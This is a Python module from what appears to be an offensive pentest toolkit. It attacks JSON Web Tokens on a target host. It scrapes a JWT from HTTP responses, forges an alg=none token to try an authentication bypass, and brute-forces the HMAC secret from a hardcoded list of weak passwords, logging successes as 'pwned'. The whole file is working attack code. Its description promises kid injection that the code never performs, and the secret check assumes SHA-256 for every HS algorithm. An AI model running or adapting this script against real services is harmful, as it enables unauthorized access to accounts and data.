# scripts/http/attack/jwt_attack.py
import urllib.request, urllib.error, base64, json, hmac, hashlib, re
from scripts.base import BaseScript
from core.output import print_result, print_table, print_check, console
from core import session_db

WEAK_SECRETS = ["secret","password","123456","admin","test","key","mysecret",
                "supersecret","jwt_secret","your-256-bit-secret","","changeme"]

class Script(BaseScript):
    name        = "jwt-attack"
    protocol    = "http"
    category    = "attack"
    description = "Script propio: ataca JWT con alg=none bypass, weak secret brute force y kid injection."

    EXAMPLES = [
        {"flag": "--jwt", "desc": "Token JWT a atacar",
         "good": "http --script=jwt-attack -t 10.10.10.5 --jwt eyJ...",
         "bad":  "http --script=jwt-attack (sin --jwt intenta extraerlo de la respuesta)"},
    ]

    def _b64d(self, s):
        s += "=" * (4 - len(s) % 4)
        return base64.urlsafe_b64decode(s)

    def _b64e(self, b):
        return base64.urlsafe_b64encode(b).rstrip(b"=").decode()

    def _parse(self, token):
        try:
            parts = token.split(".")
            if len(parts) != 3: return None, None, None
            return json.loads(self._b64d(parts[0])), json.loads(self._b64d(parts[1])), parts
        except Exception:
            return None, None, None

    def _forge_none(self, parts):
        header = json.loads(self._b64d(parts[0]))
        payload = json.loads(self._b64d(parts[1]))
        header["alg"] = "none"
        nh = self._b64e(json.dumps(header, separators=(",",":")).encode())
        np = self._b64e(json.dumps(payload, separators=(",",":")).encode())
        return f"{nh}.{np}."

    def _try_secret(self, parts, secret):
        try:
            msg = f"{parts[0]}.{parts[1]}".encode()
            sig = hmac.new(secret.encode(), msg, hashlib.sha256).digest()
            return self._b64e(sig) == parts[2]
        except Exception:
            return False

    def run(self, **kwargs):
        port    = int(kwargs.get("port") or 80)
        timeout = int(kwargs.get("timeout") or self.target.timeout or 5)
        path    = kwargs.get("path") or "/"
        jwt     = kwargs.get("jwt")
        ip      = self.target.ip
        base    = f"http://{ip}:{port}"

        if not jwt:
            try:
                req  = urllib.request.Request(f"{base}{path}", headers={"User-Agent":"Mozilla/5.0"})
                try:
                    resp = urllib.request.urlopen(req, timeout=timeout)
                    body = resp.read(65536).decode("utf-8", errors="replace")
                    hdrs = {k.lower(): v for k, v in resp.headers.items()}
                except urllib.error.HTTPError as e:
                    body = ""; hdrs = {}
                for val in list(hdrs.values()) + [body]:
                    m = re.search(r"eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]*", val)
                    if m:
                        jwt = m.group(0)
                        print_result("HTTP", ip, "info", f"JWT encontrado: {jwt[:40]}...")
                        break
            except Exception:
                pass

        if not jwt:
            console.print("[yellow]No se encontró JWT. Usa --jwt <token>[/yellow]")
            return None

        header, payload, parts = self._parse(jwt)
        if not header:
            console.print("[red]Token JWT inválido.[/red]")
            return None

        rows = [("Algoritmo", header.get("alg","?")), ("kid", str(header.get("kid","—"))),
                ("sub", str(payload.get("sub","—"))), ("admin", str(payload.get("admin","—"))),
                ("role", str(payload.get("role","—")))]
        print_table(f"JWT Info — {ip}:{port}", ["Campo", "Valor"], rows)

        findings = []

        # alg=none
        none_token = self._forge_none(parts)
        try:
            req = urllib.request.Request(f"{base}{path}", headers={
                "User-Agent": "Mozilla/5.0", "Authorization": f"Bearer {none_token}"})
            try:
                resp   = urllib.request.urlopen(req, timeout=timeout)
                status = resp.status
            except urllib.error.HTTPError as e:
                status = e.code
            if status in (200, 201, 204):
                findings.append(("alg=none bypass", "EXITOSO", f"HTTP {status}"))
                session_db.save_finding(ip, "HTTP", "jwt_none_alg_bypass", f"port={port}")
                print_result("HTTP", ip, "pwned", "JWT alg=none BYPASS EXITOSO")
        except Exception:
            pass

        # Weak secret
        if header.get("alg","").startswith("HS"):
            for secret in WEAK_SECRETS:
                if self._try_secret(parts, secret):
                    findings.append(("Weak secret", secret if secret else "(vacío)", "Crítico"))
                    session_db.save_finding(ip, "HTTP", "jwt_weak_secret", f"secret={secret}")
                    print_result("HTTP", ip, "pwned", f"JWT SECRET: '{secret}'")
                    break

        if findings:
            print_table(f"JWT Vulnerabilities — {ip}:{port}",
                        ["Ataque", "Detalle", "Resultado"], findings)
        else:
            print_check("JWT sin vulnerabilidades obvias", ok=True)

        return {"jwt": jwt, "header": header, "payload": payload, "findings": findings}
